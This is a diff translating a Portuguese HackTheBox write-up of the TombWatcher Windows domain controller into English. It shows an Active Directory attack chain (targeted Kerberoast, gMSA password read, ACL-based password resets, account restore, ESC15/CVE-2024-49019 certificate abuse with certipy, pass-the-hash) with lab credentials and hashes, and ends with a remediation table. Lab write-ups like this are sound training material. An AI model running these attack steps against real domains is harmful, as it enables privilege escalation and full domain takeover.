@@ -5,11 +5,11 @@ categories: [Machines, HackTheBox]
 tags: [hackthebox, windows, active-directory, kerberoast, gmsa, adcs, esc15, cve-2024-49019, certipy, pass-the-hash, medium]
 ---
 
-**IP:** 10.129.232.167 | **Dificuldade:** Medium | **OS:** Windows Server 2019 DC | **Domínio:** tombwatcher.htb
+**IP:** 10.129.232.167 | **Difficulty:** Medium | **OS:** Windows Server 2019 DC | **Domain:** tombwatcher.htb
 
-## Resumo
+## Summary
 
-Domain Controller com cadeia longa de abuso de permissões AD. Credencial inicial de henry permite WriteSPN sobre alfred → Targeted Kerberoast → crack da senha. Alfred usa AddSelf para entrar no grupo INFRASTRUCTURE → leitura da senha gMSA do ansible_devs. ansible_devs tem ForceChangePassword sobre sam → reset. sam tem WriteOwner sobre john → GenericAll → reset da senha. john tem GenericAll sobre a OU ADCS → restaura cert_admin do AD Recycle Bin. Com cert_admin, explora **ESC15 (CVE-2024-49019)**: template WebServer com `EnrolleeSuppliesSubject` e Schema Version 1 permite injetar política de Client Authentication → assina certificado como Administrator → Pass-the-Hash.
+Domain Controller with a long AD ACL abuse chain. Initial creds for henry allow WriteSPN over alfred → Targeted Kerberoast → password crack. Alfred uses AddSelf to join INFRASTRUCTURE → reads the ansible_devs gMSA password. ansible_devs has ForceChangePassword over sam → reset. sam has WriteOwner over john → GenericAll → password reset. john has GenericAll over the ADCS OU → restores cert_admin from AD Recycle Bin. With cert_admin, **ESC15 (CVE-2024-49019)** is exploited: the WebServer template with `EnrolleeSuppliesSubject` and Schema Version 1 allows injecting a Client Authentication policy → certificate signed as Administrator → Pass-the-Hash.
 
 | Flag | Hash |
 |------|------|
@@ -18,20 +18,20 @@ Domain Controller com cadeia longa de abuso de permissões AD. Credencial inicia
 
 ---
 
-## 1. Reconhecimento
+## 1. Reconnaissance
 
 ```bash
 nmap -sV -sC -T4 -Pn --open 10.129.232.167
 echo "10.129.232.167 tombwatcher.htb DC01.tombwatcher.htb" | sudo tee -a /etc/hosts
 ```
 
-**Credencial inicial:** `henry:H3nry_987TGV!`
+**Initial creds:** `henry:H3nry_987TGV!`
 
 ---
 
 ## 2. Targeted Kerberoast (henry → alfred)
 
-henry tem **WriteSPN** sobre alfred → torna alfred Kerberoastable:
+henry has **WriteSPN** over alfred → makes alfred Kerberoastable:
 
 ```bash
 python3 targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' \
@@ -43,9 +43,9 @@ hashcat -m 13100 alfred.hash rockyou.txt
 
 ---
 
-## 3. gMSA Read (alfred → ansible_devs)
+## 3. gMSA Password Read (alfred → ansible_devs)
 
-alfred tem **AddSelf** no grupo **INFRASTRUCTURE**. Membros do INFRASTRUCTURE podem ler a senha do gMSA `ansible_dev`:
+alfred has **AddSelf** on the **INFRASTRUCTURE** group. Group members can read the `ansible_dev` gMSA password:
 
 ```bash
 bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
@@ -89,9 +89,9 @@ type C:\Users\john\Desktop\user.txt
 
 ---
 
-## 6. Restaurar cert_admin do AD Recycle Bin
+## 6. Restore cert_admin from AD Recycle Bin
 
-john tem **GenericAll** sobre a OU **ADCS**. A conta `cert_admin` está deletada:
+john has **GenericAll** over the **ADCS** OU. The `cert_admin` account is deleted:
 
 ```powershell
 Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
@@ -110,14 +110,14 @@ bloodyAD --host 'DC01.tombwatcher.htb' -d tombwatcher.htb \
 
 ## 7. ESC15 — CVE-2024-49019
 
-O template **WebServer** tem:
+The **WebServer** template has:
 - `EnrolleeSuppliesSubject = True`
-- **Schema Version = 1** (sem restrição de Application Policy)
-- Extended Key Usage = Server Authentication
+- **Schema Version = 1** (no Application Policy restriction)
+- Extended Key Usage = Server Authentication only
 
-Com Schema Version 1, é possível injetar OIDs de Application Policy arbitrários, incluindo **Client Authentication** (`1.3.6.1.4.1.311.20.2.1`) para Smart Card Logon.
+With Schema Version 1, arbitrary Application Policy OIDs can be injected — including **Client Authentication** (`1.3.6.1.4.1.311.20.2.1`) which enables Smart Card Logon.
 
-**Passo 1 — Solicitar certificado com injeção de Client Auth:**
+**Step 1 — Request certificate with Client Auth injection:**
 
 ```bash
 certipy req \
@@ -131,7 +131,7 @@ certipy req \
   -out cert_admin
 ```
 
-**Passo 2 — Solicitar certificado como Administrator:**
+**Step 2 — Request certificate on behalf of Administrator:**
 
 ```bash
 certipy req \
@@ -145,7 +145,7 @@ certipy req \
   -out administrator
 ```
 
-**Passo 3 — Auth e hash NTLM:**
+**Step 3 — Authenticate and retrieve NTLM hash:**
 
 ```bash
 certipy auth -dc-ip 10.129.232.167 -pfx administrator.pfx
@@ -160,13 +160,13 @@ type C:\Users\Administrator\Desktop\root.txt
 
 ---
 
-## Diagrama
+## Attack Chain
 
 ```
 henry (H3nry_987TGV!)
   ↓ WriteSPN → Targeted Kerberoast
 alfred (basketball)
-  ↓ AddSelf → INFRASTRUCTURE → gMSA Read
+  ↓ AddSelf → INFRASTRUCTURE → gMSA read
 ansible_devs (NTLM: cba56cd2df7d642f622e2a59956f6d47)
   ↓ ForceChangePassword
 sam (Rogue@123!)
@@ -180,11 +180,11 @@ administrator NTLM → PTH → root.txt
 
 ---
 
-## Lições Aprendidas
+## Lessons Learned
 
-| Vulnerabilidade | Remediação |
-|-----------------|------------|
-| WriteSPN sem restrição | Auditar quem tem WriteSPN; usar Kerberos pre-auth forte |
-| gMSA password acessível a grupos desnecessários | Restringir PrincipalsAllowedToRetrieveManagedPassword |
-| ESC15 (CVE-2024-49019) — Schema V1 + EnrolleeSuppliesSubject | Atualizar/desabilitar templates Schema Version 1 |
-| AD Recycle Bin restaura contas privilegiadas | Monitorar restauração de objetos; purgar contas desnecessárias |
+| Vulnerability | Remediation |
+|---------------|-------------|
+| WriteSPN without restriction | Audit who holds WriteSPN; enforce strong Kerberos pre-auth |
+| gMSA password readable by unnecessary groups | Restrict PrincipalsAllowedToRetrieveManagedPassword |
+| ESC15 (CVE-2024-49019) — Schema V1 + EnrolleeSuppliesSubject | Upgrade or disable Schema Version 1 templates |
+| AD Recycle Bin restoring privileged accounts | Monitor object restoration; purge unnecessary accounts |
